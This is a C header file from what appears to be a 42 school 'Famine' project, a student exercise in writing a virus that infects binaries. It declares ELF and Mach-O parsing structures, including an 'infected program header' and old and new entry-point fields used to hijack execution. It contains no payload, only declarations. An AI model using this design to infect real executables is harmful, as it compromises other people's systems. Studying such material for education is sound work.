/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 20:15:02 by gbourgeo          #+#    #+#             */
/*   Updated: 2018/05/28 18:52:09 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef FAMINE_H
# define FAMINE_H

# include <fcntl.h>
# include <unistd.h>
# include <sys/mman.h>
# include <sys/types.h>
# ifdef __linux__
#  include <elf.h>
# elif __APPLE__
#  include <mach-o/loader.h>
# endif

typedef struct		s_env
{
	void			*data;
	int				size;
	char			*path;
}					t_env;

# ifdef __linux__
typedef struct		s_elf64
{
	Elf64_Ehdr		*header;
	Elf64_Shdr		*section;
	Elf64_Phdr		*program;
	Elf64_Phdr		*iprogram; // infected program header
	Elf64_Addr		old_entry;
	Elf64_Addr		new_entry;
}					t_elf64;
# elif __APPLE__
typedef struct		s_macho64
{

}					t_macho64;
# endif

void		get_elf(t_env *e);
void		pack_elf64(t_env *e);
void		get_macho(t_env *e);

#endif /* FAMINE_H */
